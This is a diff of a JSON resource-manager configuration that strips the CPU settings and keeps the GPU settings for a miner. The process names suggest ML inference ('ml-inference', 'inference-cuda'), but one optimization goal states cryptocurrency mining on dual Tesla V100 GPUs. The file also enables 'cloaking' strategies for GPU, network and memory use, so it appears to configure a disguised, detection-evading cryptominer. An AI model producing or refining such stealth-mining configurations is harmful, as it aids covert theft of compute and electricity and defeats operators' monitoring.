@@ -2,7 +2,6 @@
     "_comment": "Cấu hình tài nguyên dành cho ResourceManager...",
 
     "processes": {
-        "CPU": "ml-inference",
         "GPU": "inference-cuda"
     },
     "process_priority_map": {
@@ -21,7 +20,6 @@
     },
 
     "cloaking_strategies": {
-        "cpu_cloaking":   { "enabled": true, "debug": true },
         "gpu_cloaking":   { "enabled": true, "debug": true },
         "network":        { "enabled": true, "debug": true },
         "memory":         { "enabled": true, "debug": true },
@@ -29,12 +27,6 @@
     },
 
     "resource_allocation": {
-        "cpu": {
-            "max_threads": 12,
-            "default_freq_mhz": 2600,
-            "min_freq_mhz": 1800,
-            "max_freq_mhz": 2600
-        },
         "ram": {
             "max_allocation_mb": 131072
         },
@@ -74,7 +66,6 @@
     },
 
     "temperature_limits": {
-        "cpu_max_celsius": 85,
         "gpu_max_celsius": 85
     },
 
@@ -83,14 +74,12 @@
             "max": 650
         },
         "per_device_power_watts": {
-            "cpu": 150,
             "gpu_total": 500,
             "gpu_per_unit": 250
         }
     },
 
     "baseline_thresholds": {
-        "cpu_usage_percent": 90,
         "gpu_usage_percent": 90,
         "ram_usage_percent": 90,
         "disk_io_usage_mbps": 90,
@@ -140,7 +129,6 @@
         "os_name": "Ubuntu",
         "os_version": "22.04 LTS",
         "resource_limits": {
-            "cpu_usage_percent": 90.0,
             "ram_usage_percent": 90.0,
             "gpu_usage_percent": 90.0,
             "network_bandwidth_mbps": 500.0,
@@ -149,8 +137,6 @@
     },
 
     "optimization_goals": {
-        "cpu_threads": "Optimize to balance CPU load.",
-        "frequency": "Maximize performance while reducing energy consumption.",
         "ram_allocation_mb": "Ensure sufficient RAM allocation without waste.",
         "gpu_usage_percent": "Balance GPU usage to avoid bottlenecks.",
         "gpu_accelerators": "Leverage dual Tesla V100 GPUs for parallel cryptocurrency mining operations with optimal power efficiency.",
@@ -169,7 +155,6 @@
     },
 
     "alert_thresholds": {
-        "cpu_usage_percent": 90,
         "gpu_usage_percent": 90,
         "ram_usage_percent": 90,
         "disk_io_usage_mbps": 90,
